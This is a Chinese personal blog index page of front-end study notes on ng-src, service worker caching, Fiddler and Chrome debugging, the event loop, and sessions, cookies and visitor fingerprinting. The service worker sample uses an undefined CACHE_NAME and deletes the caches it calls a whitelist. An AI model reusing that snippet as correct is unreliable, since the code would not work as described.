<!doctype html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="My Little World" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />






<meta property="og:type" content="website">
<meta property="og:title" content="My Little World">
<meta property="og:url" content="http://yoohannah.github.io/page/2/index.html">
<meta property="og:site_name" content="My Little World">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="My Little World">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoohannah.github.io/page/2/"/>





  <title> My Little World </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  










  
  
    
  

  <div class="container one-collumn sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">My Little World</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">learn and share</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/knowledge/ngsrc.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/knowledge/ngsrc.html" itemprop="url">
                  ng-src
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-04T22:47:15+08:00">
                2018-01-04
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="ng-src"><a href="#ng-src" class="headerlink" title="ng-src"></a>ng-src</h1><p>img 里面使用src=”{ { } }“会在页面一开始加载模板的时候，不会执行{ { } }，直接去请求资源，造成404错误<br>如果使用ng-src = “{ { } }“就会避免以上问题，ng-src会先去执行{ { } },得到资源地址后再去请求资源<br>ng-src 指令确保的 AngularJS 代码执行前不显示图片。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/knowledge/serviceworker.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/knowledge/serviceworker.html" itemprop="url">
                  service worker
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-03T22:52:15+08:00">
                2018-01-03
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>前端与后台代理服务器</p>
<h2 id="主要方法"><a href="#主要方法" class="headerlink" title="主要方法"></a>主要方法</h2><p>fetch 事件/方法:service worker向后台发起HTTP请求的方法<br>fetch(url).then()</p>
<p>message事件/方法:页面和service worker之间进行通信的方法;同一页面两个窗口之间通信（web worker线程)<br>postMessage发送消息;message接收消息</p>
<p>caches API:处理缓存</p>
<h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><p>注册 register<br>安装 install<br>激活 activation<br>更新 Update<br>service-worker.js文件更新被浏览器发现后，会进入waitting等待状态，当前页面依旧使用旧文件进行work，<br>直到当前页面关闭，旧版本文件的service worker才会被kill掉，新版本文件的service worker开始接管页面的缓存资源<br>新的service worker一开始接管就会触发activate事件，从而可以做一些上次老版本缓存的工作</p>
<p>缓存的文件发生更新，可以在fetch 的时候，一边检查更新从而更新缓存，一边检查缓存然后fetch新资源给浏览器，<br>通过 promise 的 resolve 特性来决定谁快</p>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>（https环境）<br>后台消息传递<br>网络代理，转发请求，伪造响应<br>离线缓存<br>消息推送</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line">//在项目入口/配置js文件 进行注册</div><div class="line">if (navigator.serviceWorker) &#123;</div><div class="line">    navigator.serviceWorker.register(&apos;service-worker.js&apos;).then(function(registration) &#123;</div><div class="line">        console.log(&apos;service worker 注册成功&apos;);</div><div class="line">    &#125;).catch(function (err) &#123;</div><div class="line">        console.log(&apos;servcie worker 注册失败&apos;)</div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">//service-worker.js 放在项目根目录下,service worker的执行代码</div><div class="line">var cacheFiles = [ //指定缓存的文件</div><div class="line">    &apos;about.js&apos;,</div><div class="line">    &apos;blog.js&apos;</div><div class="line">];</div><div class="line">self.addEventListener(&apos;install&apos;, function (evt) &#123; //在安装的时候就将指定文件存入cache storage中</div><div class="line">    evt.waitUntil(</div><div class="line">        caches.open(&apos;my-test-cahce-v1&apos;).then(function (cache) &#123; //使用caches api进行缓存操作</div><div class="line">            return cache.addAll(cacheFiles);</div><div class="line">        &#125;)</div><div class="line">    );</div><div class="line">&#125;);</div><div class="line">//页面fetch 资源时进行过滤</div><div class="line">self.addEventListener(&apos;fetch&apos;, function(event) &#123;</div><div class="line">  event.respondWith(</div><div class="line">    caches.match(event.request) //检查缓存是否有资源</div><div class="line">      .then(function(response) &#123;</div><div class="line">        if (response) &#123; //如果有直接返回</div><div class="line">          return response;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        // 因为 event.request 流已经在 caches.match 中使用过一次，</div><div class="line">        // 那么该流是不能再次使用的。我们只能得到它的副本，拿去使用。</div><div class="line">        var fetchRequest = event.request.clone();</div><div class="line"></div><div class="line">        // fetch 的通过信方式，得到 Request 对象，然后发送请求</div><div class="line">        return fetch(fetchRequest).then(</div><div class="line">          function(response) &#123;</div><div class="line">            // 检查是否成功</div><div class="line">            if(!response || response.status !== 200 || response.type !== &apos;basic&apos;) &#123;</div><div class="line">              return response;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            // 如果成功，该 response 一是要拿给浏览器渲染，而是要进行缓存。</div><div class="line">            // 由于 caches.put 使用的是文件的响应流，一旦使用，</div><div class="line">            // 那么返回的 response 就无法访问造成失败，所以，这里需要复制一份。</div><div class="line">            var responseToCache = response.clone();</div><div class="line"></div><div class="line">            caches.open(CACHE_NAME)</div><div class="line">              .then(function(cache) &#123;</div><div class="line">                cache.put(event.request, responseToCache);</div><div class="line">              &#125;);</div><div class="line"></div><div class="line">            return response;</div><div class="line">          &#125;</div><div class="line">        );</div><div class="line">      &#125;)</div><div class="line">    );</div><div class="line">&#125;);</div><div class="line"></div><div class="line">//service-worker.js文件更新删除之前版本文件缓存的资源</div><div class="line"></div><div class="line">self.addEventListener(&apos;activate&apos;, function(event) &#123;</div><div class="line"></div><div class="line">  var cacheWhitelist = [&apos;v1&apos;];</div><div class="line"></div><div class="line">  event.waitUntil(</div><div class="line">  // 遍历 caches 里所有缓存的 keys 值</div><div class="line">    caches.keys().then(function(cacheNames) &#123;</div><div class="line">      return Promise.all(</div><div class="line">        cacheNames.map(function(cacheName) &#123;</div><div class="line">          if (cacheWhitelist.includes(cacheName)) &#123;</div><div class="line">          // 删除 v1 版本缓存的文件</div><div class="line">            return caches.delete(cacheName);</div><div class="line">          &#125;</div><div class="line">        &#125;)</div><div class="line">      );</div><div class="line">    &#125;)</div><div class="line">  );</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p><a href="https://segmentfault.com/a/1190000008050742" target="_blank" rel="external">相关文档</a><br><a href="https://www.villainhr.com/page/2016/09/25/%E5%89%8D%E7%AB%AF%20fetch%20%E9%80%9A%E4%BF%A1" target="_blank" rel="external">fetch 通信</a><br><a href="https://www.villainhr.com/page/2016/08/22/Web%20Worker" target="_blank" rel="external">web worker 语法</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="external">Service Worker API</a></p>
<p>遗留问题：fetch通信headers添加token字段,不生效</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/knowledge/fiddler.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/knowledge/fiddler.html" itemprop="url">
                  调试
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-03T22:47:15+08:00">
                2018-01-03
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="fiddler-使用"><a href="#fiddler-使用" class="headerlink" title="fiddler 使用"></a>fiddler 使用</h1><p>浏览器向服务器发送请求的拦截器</p>
<h2 id="statistic"><a href="#statistic" class="headerlink" title="statistic"></a>statistic</h2><p>查看一次请求各阶段所发生的时间，HTTP performance<br><img src="/image/fiddler5.png" alt="fiddler5"></p>
<h1 id="Inspectors"><a href="#Inspectors" class="headerlink" title="Inspectors"></a>Inspectors</h1><p>查看报文，上半部分是request,下半部分是response<br><img src="/image/fiddler4.png" alt="fiddler4"></p>
<h2 id="AutoResponder"><a href="#AutoResponder" class="headerlink" title="AutoResponder"></a>AutoResponder</h2><p>拦截本来要发给真正服务器的指定请求,将本地资源作为response返回去<br><img src="/image/fiddler3.png" alt="fiddler3"><br>1.开启规则<br>2.添加规则<br>3.指定请求，若以EXACT：开头，要写完整的请求路径;模糊匹配的话就不要写EXACT：<br>4.指定作为response的本地路径资源地址<br>5.确认规则配置完毕</p>
<h2 id="composer"><a href="#composer" class="headerlink" title="composer"></a>composer</h2><p>自己创建request 向服务器发送请求<br><img src="/image/fiddler2.png" alt="fiddler2"><br>配置好request后，点击excute按钮手动向服务器发送请求</p>
<h2 id="Filters"><a href="#Filters" class="headerlink" title="Filters"></a>Filters</h2><p>只拦截指定的请求,其他请求不拦截，指定多个时用逗号隔开<br><img src="/image/fiddler1.png" alt="fiddler1"><br>填写指定请求时，编辑框为黄色，为未保存状态，点击右上角‘Changes not yet saved’确认配置完毕</p>
<h1 id="谷歌浏览器调试常用"><a href="#谷歌浏览器调试常用" class="headerlink" title="谷歌浏览器调试常用"></a>谷歌浏览器调试常用</h1><h2 id="将respose进行json格式转换"><a href="#将respose进行json格式转换" class="headerlink" title="将respose进行json格式转换"></a>将respose进行json格式转换</h2><p>1.右键接口选择copy-&gt;copy response;<br>2.在console界面执行copy()函数<br>copy(   ctrl+v    )   回车<br>3.打开编辑器，新建一个文件，ctrl+v,就得到response 的json格式<br><img src="/image/debug1.gif" alt="debug1"></p>
<h2 id="调试js"><a href="#调试js" class="headerlink" title="调试js"></a>调试js</h2><p>在当前页面的js里面修改或添加代码后，ctrl+s 然后在页面触发更改的代码，即可进行调试<br>但要注意需要刷新才能执行到的代码，不能用这种方式进行调试</p>
<h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><p>直接在代码序号上进行点击即添加了断点<br>取消断点就再点击断点<br>退出断点调试就点右上角<br><img src="/image/debug2.png" alt="debug2"><br>禁用断点<br><img src="/image/debug3.png" alt="debug3"><br>如果想知道当前断点上的变量值，只需要将鼠标放在变量上即可<br><a href="https://www.zybuluo.com/lxjwlt/note/434612" target="_blank" rel="external">相关链接</a><br><a href="http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html" target="_blank" rel="external">相关链接</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/knowledge/eventloop.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/knowledge/eventloop.html" itemprop="url">
                  关于事件循环event-loop
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-01T21:47:15+08:00">
                2018-01-01
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="js单线程"><a href="#js单线程" class="headerlink" title="js单线程"></a>js单线程</h1><p>同一时间只干一件事，干完一件事再干下一件事，<br>如果前一个任务耗时很长，后一个任务也得一直等着</p>
<p>为什么这样设计？<br>js 要指挥浏览器干活，如果有两个线程同时执行任务，一个删除DOM，一个修改该DOM，浏览器会不知道以哪个线程为准</p>
<h1 id="任务队列"><a href="#任务队列" class="headerlink" title="任务队列"></a>任务队列</h1><p>同步任务，在主线程上排队执行的任务，前一个执行完才能执行后一个任务<br>异步任务，一开始不进入主线程，而进入‘任务队列’被挂起，只有‘任务队列’通知主线程某个异步任务可以执行了，该任务才会进入主线程<br>或者主线程上没有要执行的任务了，就会去任务队列拿任务 ，在确认该到达规定时间后，就给到主线程进行执行其对应的回调函数</p>
<h1 id="event-Loop"><a href="#event-Loop" class="headerlink" title="event Loop"></a>event Loop</h1><p>主线程从”任务队列”中读取事件，这个过程是循环不断的，所以整个的这种运行机制又称为Event Loop（事件循环）<br>setTimeout(fn,0)的含义是，指定某个任务在主线程最早可得的空闲时间执行，即尽可能早得执行<br>另外如果主线程的栈中当前代码耗时很长，要等很久，按照先主线程，再任务队列的执行顺序，<br>就没办法保证setTimeout的回调函数fn能够在指定的时间执行</p>
<h1 id="node-js-event-loop"><a href="#node-js-event-loop" class="headerlink" title="node.js event loop"></a>node.js event loop</h1><p>nodejs 运行机制：<br> (1）V8引擎解析JavaScript脚本。<br>（2）解析后的代码，调用Node API。<br>（3）libuv库负责Node API的执行。它将不同的任务分配给不同的线程，形成一个Event Loop（事件循环），以异步的方式将任务的执行结果返回给V8引擎。<br>（4）V8引擎再将结果返回给用户。</p>
<p>与任务队列相关方法<br>process.nextTick:在主线程任务全部结束后，读取任务队列的任务之前执行它所指定的函数，<br>如果指定函数里还套嵌process.nextTick方法，或者有多个process.nextTick方法，都要在本轮读取任务队列前执行完<br>setImmediate：它指定的任务总是在下一次的eventloop时执行，<br>如果setImmediate与setTimeout(fn,0)各自添加了一个回调函数，那么在下一loop时，他们回调函数的顺序是不确定<br>如果setImmediate套嵌setImmediate方法,则套嵌的回调函数会被注册到下一轮事件循环中再执行</p>
<p>即多个process.nextTick语句总是在当前”执行栈”一次执行完，多个setImmediate可能则需要多次loop才能执行完。</p>
<p><a href="http://www.ruanyifeng.com/blog/2014/10/event-loop.html" target="_blank" rel="external">相关链接</a></p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>task/macrotask:script（整体代码）, setTimeout, setInterval, setImmediate, I/O, UI rendering<br>micotask:process.nextTick, Promises（这里指浏览器实现的原生 Promise）, Object.observe, MutationObserver<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">process.nextTick(() =&gt; &#123;</div><div class="line">  console.log(&apos;nextTick&apos;)</div><div class="line">&#125;)</div><div class="line">Promise.resolve()</div><div class="line">  .then(() =&gt; &#123;</div><div class="line">    console.log(&apos;then&apos;)</div><div class="line">  &#125;)</div><div class="line">setImmediate(() =&gt; &#123;</div><div class="line">  console.log(&apos;setImmediate&apos;)</div><div class="line">&#125;)</div><div class="line">console.log(&apos;end&apos;)</div><div class="line"></div><div class="line">//结果</div><div class="line">end</div><div class="line">nextTick</div><div class="line">then</div><div class="line">setImmediate</div></pre></td></tr></table></figure></p>
<p>micro-task在ES2015规范中称为Job,<br>promise.then的执行其实是向PromiseJobs添加Job</p>
<p>在eventloop中，一个task执行完会检查micotask队列，如果有，则先执行micotask，然后再去异步队列领取任务<br><a href="https://github.com/creeperyang/blog/issues/21" target="_blank" rel="external">相关</a><br><a href="https://segmentfault.com/a/1190000010913949" target="_blank" rel="external">相关</a><br><a href="https://www.cnblogs.com/dong-xu/p/7000139.html" target="_blank" rel="external">相关</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/knowledge/session&cookie.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/knowledge/session&cookie.html" itemprop="url">
                  session 和cookie
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-28T08:17:15+08:00">
                2017-12-28
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="正常情况下身份识别"><a href="#正常情况下身份识别" class="headerlink" title="正常情况下身份识别"></a>正常情况下身份识别</h1><p>用户提交登录信息，服务器拿到登录信息进行验证之后，<br>为该用户在session表中建立唯一sessionid,然后在返回响应的时候，将sessionid放在set-cookie中告诉浏览器，将sessionid 放在cookie表中，下次请求的时候放在cookie中再发给我<br>这样用户在已登录的状态下进行的访问请求,浏览器都会在报文中将sessionid放在cookie中给回服务器<br>服务器拿到cookie 就能判断用户是否进行了登录，并根据session表确定登录身份</p>
<h1 id="session-机制"><a href="#session-机制" class="headerlink" title="session 机制"></a>session 机制</h1><p>当用户访问服务器时,服务器就会先检查请求有没有带sessionid,<br>如果没带的话,就为该用户在session列表中建立一个session，<br>(这个session是存储特定用户会话所需的属性及配置信息的一个对象，开发人员可以控制里面是什么内容，可以自定义的)<br>并生成唯一sessionid通过set-cookie给回用户<br>如果有带的话,就根据sessionid 在列表中查找对应的session,将session 取出来使用，如果没找到则可能新建一个</p>
<p>1.浏览器禁用cookie解决办法<br>让浏览器重写url：将sessionid 以参数或者附加信息方式放在url后面传递给服务器<br>表单隐藏字段：服务器在返回表单的时候就将sessionid 以隐藏字段方式给过去,客户端提交表单的时候就一并传回来</p>
<p>2.session什么时候被删除<br>过期就会自动删除<br>执行特定删除命令的时候，比如注销<br>session存在内存中的时候，当服务器被重启或者停止时，session列表会被清空</p>
<p>3.session存储<br>一般存在内存中，但服务器重启或者停止会被清空<br>如果想持久保存，可以放在硬盘里面，这样服务器重启或者停止不会被清空</p>
<h1 id="cookie-机制"><a href="#cookie-机制" class="headerlink" title="cookie 机制"></a>cookie 机制</h1><p>浏览器拿到set-cookie后，会根据sessionid ,域名，路径等相关信息，生成cookie，存到cookie列表中<br>当用户要请求服务器时，就根据请求资源路径去查cookie表，找到的cookie可用的范围如果大于等于请求路径,<br>就将cookie放在请求头给回服务器</p>
<p>1.cookie存储<br>会话cookie存储在内存中，页面关闭就删除<br>设置了过期时间的cookie,会被存储在硬盘上，直到超过设定时间才会被删除</p>
<p>2.cookie与浏览器<br>存储在硬盘上的cookie可以在不同浏览器进程间共享<br>对于内存上的cookie不同浏览器有不同处理方式<br>IE通过 ctrl+N 的方式打开的窗口可以与原窗口共享cookie,但其他方式不行<br>而火狐的所有进程和标签页都可以共享cookie</p>
<p>一般情况下通过js window.open打开的窗口会与原窗口共享内存cookie</p>
<h1 id="游客识别跟踪"><a href="#游客识别跟踪" class="headerlink" title="游客识别跟踪"></a>游客识别跟踪</h1><p>用户未登录情况下进行页面请求，且之后都不进行登录操作的情况下，还要与用户保持可进行身份识别的通信，<br>这种情景解决办法可以有<br>A.<br>一般就需要依靠识别机器来识别用户了<br>首先给未登录用户设置访问用户cookie,<br>根据不同机型用canvas写字像素是不一样的原理<br>这个cookie由游客设备的各种机器特征码组合起来生成给到服务器，<br>服务器存起来<br>下次再访问的时候，就依靠客户端建立的cookie进行识别<br>或者将机器信息传给服务器，由服务器生成再传给浏览器</p>
<p>B.<br>使用fingerprint.js包，它是一个可以根据浏览器的代理字符串，屏幕色深，语言，插件安装与支持的 MIME 类型，时区偏移量和其他功能，如本地存储和会话存储等等，<br>然后这些值通过散列函数传递产生指纹，不需要通过 Cookie 存储就可以识别浏览器</p>
<p>由未登录到登录态要做的事情就要注意两个账号的关联</p>
<p>奇葩问题：在一台设备登录过多个账号的情况下，怎样进行未登录数据的关联<br>首先设备一般会让你先退出再登录另一个账号,<br>即便要登录多个账号,要做关联，在第一个用户登录后就关联完了，后面多个再登录已经不再是由未登录到登录状态了</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/knowledge/jsonp.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/knowledge/jsonp.html" itemprop="url">
                  关于jsonp
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-01T07:57:15+08:00">
                2017-12-01
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
